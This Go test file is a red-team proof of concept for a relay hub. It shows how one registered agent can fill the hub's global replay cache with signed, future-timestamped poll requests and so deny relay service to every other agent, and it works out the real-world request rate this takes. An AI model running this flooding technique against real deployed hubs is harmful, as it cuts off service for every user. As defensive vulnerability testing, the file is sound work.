package aghub

// Red-team PoC (lens si2, X1 authenticated send). A passing test means the
// defect is present.

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strconv"
	"testing"
	"time"

	"github.com/ANetResearch/ANetCore/identity"
	"github.com/ANetResearch/ANetCore/relayauth"
	"github.com/ANetResearch/ANetCore/seal"

	"github.com/ANetResearch/ANetHub/internal/hubid"
)

// TestRedteamX1_OneRegisteredAgentFillsTheReplayCacheAndStopsEveryonesRelay:
// X1 bounds a sender by the per-sender bucket on /relay/send only. Every
// signed endpoint writes the relayauth v2 replay cache, which is global,
// bounded (defaultReplayCacheMax = 1<<20) and refuses ALL signed requests
// with 503 once full (auth2.go admit / verifyV2). /relay/poll, /relay/ack,
// POST /agents/{aid}/keys, /profile ... have no per-signer limit, and a
// signature with X-ANet-TS up to +5 min in the future stays in the cache
// for 10 min. One registered AID signing ~1,750 polls/s (1<<20 / 600 s)
// therefore keeps the cache full, and every other agent's /relay/send and
// /relay/poll answer 503: the hub relays nothing for anybody.
//
// Scaled PoC: the cache bound is set to 64 (the mechanism is identical;
// only the constant differs). The attacker sends 64 signed polls with a
// future timestamp; the victim's next /relay/send is refused 503.
func TestRedteamX1_OneRegisteredAgentFillsTheReplayCacheAndStopsEveryonesRelay(t *testing.T) {
	store, err := Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()
	id, err := hubid.LoadOrIncept(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	s := NewServer(store)
	s.SetHubAID(id.AID)
	const scaledMax = 64
	s.replay = newReplayCache(scaledMax)
	srv := httptest.NewServer(s.Handler())
	defer srv.Close()

	mk := func() *identity.Controller {
		c, err := identity.Incept()
		if err != nil {
			t.Fatal(err)
		}
		kel, _ := identity.MarshalKEL(c.KEL())
		if err := store.PutAgent(c.AID(), "n", nil, kel); err != nil {
			t.Fatal(err)
		}
		return c
	}
	attacker, victim, recip := mk(), mk(), mk()

	do := func(c *identity.Controller, action, path string, body any, at time.Time) (int, string) {
		raw, _ := json.Marshal(body)
		req, _ := http.NewRequest(http.MethodPost, srv.URL+path, bytes.NewReader(raw))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-ANet-Wire", "2")
		ts := uint64(at.UnixMilli())
		sig, seq := c.Sign(relayauth.PreimageV2(action, c.AID(), id.AID, ts, req.Method, req.URL.RequestURI(), raw))
		req.Header.Set(relayauth.HeaderAID, c.AID())
		req.Header.Set(relayauth.HeaderTS, strconv.FormatUint(ts, 10))
		req.Header.Set(relayauth.HeaderSeq, strconv.FormatUint(seq, 10))
		req.Header.Set(relayauth.HeaderSig, relayauth.EncodeSig(sig))
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		b, _ := io.ReadAll(resp.Body)
		return resp.StatusCode, string(b)
	}

	// The attacker only polls its own (empty) mailbox. Each poll is a
	// fresh signature; the timestamp is 4m50s ahead, inside the skew
	// window, so each entry lives ~10 minutes.
	future := time.Now().Add(4*time.Minute + 50*time.Second)
	for i := 0; i < scaledMax; i++ {
		if code, b := do(attacker, relayauth.ActionPoll, "/relay/poll",
			map[string]any{"limit": 1 + i}, future.Add(time.Duration(i)*time.Millisecond)); code != 200 {
			t.Fatalf("attacker poll %d: %d %s (a per-signer limit on poll would stop the attack here)", i, code, b)
		}
	}

	env := &seal.SealedEnvelope{V: seal.EnvelopeVersion, To: recip.AID(), Suite: seal.SuiteX25519,
		KID: bytes.Repeat([]byte{7}, seal.KIDLen), Enc: bytes.Repeat([]byte{9}, 32), CT: []byte("ct")}
	envB, _ := env.Marshal()
	code, b := do(victim, relayauth.ActionSend, "/relay/send",
		map[string]any{"to_aid": recip.AID(), "envelope": base64.StdEncoding.EncodeToString(envB)}, time.Now())
	if code != http.StatusServiceUnavailable {
		t.Fatalf("victim send: %d %s; the attacker's polls did not deny service", code, b)
	}
	code2, b2 := do(recip, relayauth.ActionPoll, "/relay/poll", map[string]any{}, time.Now())
	if code2 != http.StatusServiceUnavailable {
		t.Fatalf("recipient poll: %d %s", code2, b2)
	}
	t.Logf("ATTACK OK: after %d signed polls by one agent, an unrelated agent's /relay/send got %d %s "+
		"and another's /relay/poll got %d; at the real bound this takes ~1,750 polls/s from one AID",
		scaledMax, code, b, code2)
}
